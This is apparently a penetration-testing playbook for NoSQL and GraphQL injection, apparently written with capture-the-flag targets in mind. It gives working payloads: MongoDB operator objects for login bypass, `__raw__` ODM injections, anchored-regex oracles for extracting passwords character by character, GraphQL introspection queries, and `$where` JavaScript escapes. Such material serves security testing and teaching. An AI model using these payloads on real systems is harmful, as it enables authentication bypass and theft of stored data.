# NoSQL / GraphQL Injection

First prove that an object, operator, or field selector reaches the backend query layer. Do not confuse "the API can return a field" with injection.

## Entry Signals

- JSON login, search, filter, or sort parameters are merged directly into a query object.
- URL query supports nested objects such as `username[$ne]=x`.
- MongoDB/Mongoose/MongoEngine errors, `filter(**data)`, `Q(**data)`, or dynamic field names appear.
- GraphQL resolvers accept JSON scalars or filter/search objects, or errors suggest hidden fields.
- Replacing a string with an object stably changes login state, result count, error text, or timing.

## Parser Boundary

Confirm that the backend receives an object rather than a string:

- `Content-Type`: `application/json`, `application/x-www-form-urlencoded`, GraphQL variables, and JSON cookies can use different parsers.
- URL nesting: `a[$ne]=x`, `a[regex]=x`, and `filter[field][$regex]=^a` depend on the query parser.
- Duplicate keys: JSON/object merge behavior may let the later key overwrite the earlier one.
- Type confusion: equality checks that pass directly into an ORM/ODM may accept `{not: ...}`, `{"$ne": ...}`, or arrays.

## Operator Validation

Authentication points:

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":{"$regex":"^admin$"},"password":{"$gt":""}}
```

URL nested form:

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$regex]=.*
```

Search/filter points:

```json
{"field":{"$exists":true}}
{"field":{"$regex":"^prefix"}}
{"$or":[{"username":"admin"},{"role":"admin"}]}
{"field":{"$in":["admin","root","administrator"]}}
```

If the object is stringified, move back to the parser boundary: content type, JSON versus form, duplicate parameters, array parameters, or GraphQL variable types.

## MongoEngine / ODM

Dynamic `filter(**data)` is risky when keys pass through into query expressions. First prove whether `__raw__` or double-underscore lookup is preserved:

```json
{"__raw__":{"username":"candidate"}}
{"__raw__":{"target_field":{"$exists":true}}}
{"__raw__":{"target_field":{"$regex":"^known_prefix"}}}
{"username__regex":"^admin"}
```

Evidence standard: on the same endpoint, ordinary conditions and raw/lookup conditions produce an explainable result-set difference.

If the endpoint accepts a full aggregation pipeline, check whether `$match/$project/$lookup/$unionWith/$facet` is controllable. The goal is proving cross-collection access, return-field changes, or bypassing a preset `$match`, not assuming the whole pipeline is controllable.

## Regex / Exists Oracle

- Use `$exists` to test field presence, then request the field through the response field list or GraphQL selection set.
- Use anchored `$regex` for prefix extraction; avoid noisy `.*a.*` matches.
- Compare two candidate prefixes at a time and record the match/no-match marker.

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^b"}}
{"target_field":{"$regex":"^flag\\{"}}
```

Escape special characters before they enter a regex. If regex is blocked, try `$in`, range comparisons, or field-existence combinations.

Case sensitivity and sort order are affected by collation. Calibrate with a known field before extracting case-sensitive values.

## GraphQL

Separate three surfaces:

- Selection set: controls returned fields and may expose `role/secret/flag`.
- Argument/filter: may reach SQL or NoSQL queries.
- Variable type: determines whether object operators arrive at the resolver unchanged.

Field discovery priority: introspection, error suggestions, frontend bundles, then small field guesses.

```graphql
query {
  __type(name: "User") { fields { name type { name kind } } }
}
```

If introspection is disabled, keep error suggestions, `Cannot query field` responses, frontend query documents, `operationName`, and variable schema as substitute evidence.

When filter/search accepts objects, compare true/false conditions in the same request shape:

```graphql
query($f: JSON) {
  search(filter: $f) { username email target_field }
}
```

```json
{"f":{"__raw__":{"target_field":{"$exists":true}}}}
```

GraphQL returning a field is not enough. Prove the filter condition can select records containing that field or a target value.

When GraphQL accepts GET, still reproduce the oracle like a normal request. Treat GET delivery as relevant only for admin bot, CSRF, or XS-Leak-style side channels.

## Executing Operators

Test `$where`, server-side JavaScript, and expression execution only when evidence shows the backend uses that capability. Prefer non-executing `$exists/$regex/$ne/$in` oracles first.

```json
{"$where":"this.username=='admin'"}
```

If input is concatenated into a JavaScript regex literal or `$where` string, first prove context escape with true/false expressions:

```text
a/)||true&&(/a
a/)||false&&(/a
```

## Finding Record

```text
entry_point:
parser: json | form | graphql variables | url nested
operator_preserved:
oracle:
true_request:
false_request:
signal:
returned_fields:
extracted:
next_step:
```
